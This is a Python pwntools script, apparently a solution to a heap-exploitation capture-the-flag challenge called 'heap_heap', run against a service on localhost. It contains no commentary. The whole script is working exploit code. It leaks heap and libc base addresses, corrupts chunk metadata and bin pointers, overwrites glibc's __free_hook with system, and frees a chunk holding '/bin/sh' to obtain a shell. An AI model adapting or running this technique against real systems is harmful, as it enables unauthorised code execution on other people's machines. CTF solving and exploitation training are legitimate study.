#!/usr/bin/env python3
from pwn import *

def allocs(s,c="P",t="P"):
	p.sendlineafter("> ","1")
	p.sendlineafter("> ",str(s))
	p.sendafter("> ",t)
	p.sendafter("> ",c)

def frees(idx):
	p.sendlineafter("> ","2")
	p.sendlineafter("> ",str(idx))

def rewrites(idx,c):
	p.sendlineafter("> ","3")
	p.sendlineafter("> ",str(idx))
	p.sendafter("> ",c)

def reads(idx):
	p.sendlineafter("> ","4")
	p.sendlineafter("> ",str(idx))

#p = process("./heap_heap",env={"LD_PRELOAD":"./libc.so.6"})
p = remote("localhost",2000)
libc = ELF("./libc.so.6")

p.sendafter("> ","parrot")
allocs(0x500)
allocs(0x10,"P","/bin/sh\x00")
frees(0)
allocs(0x600)
reads(0)

p.recvuntil("Your story: ")
heapbase = int.from_bytes(p.recvuntil("HEAP")[:-5],byteorder="little") - 0x3c0
print(hex(heapbase))

allocs(0x100)
rewrites(0,"P"*0x110)
reads(0)

libc.address = int.from_bytes(p.recvuntil("HEAP")[-11:-5],byteorder="little") - libc.sym["main_arena"] - 0x60
print(hex(libc.address))

c = b"P" * 0x108
c+= p64(0x401)
rewrites(0,c)

allocs(0x2d0)
allocs(0x200)

c = b"P" * 0x3f8
c+= p64(0x110)
c+= p64(libc.sym["main_arena"]+352)
c+= p64(heapbase + 0x2d0)
rewrites(0,c)

c = b"P"*0x30
c+= p64(0)
c+= p64(0x110)
c+= p64(heapbase+0x7d0)
c+= p64(libc.sym["main_arena"]+352)
p.sendafter("> ",c)

allocs(0xf8)
c = b"F"*0xc0
c+= p64(libc.sym["__free_hook"]-8)
c+= p64(0)
allocs(0xf8,c)

p.sendafter("> ",p64(1)+p64(libc.sym["system"]))
frees(1)
p.interactive()
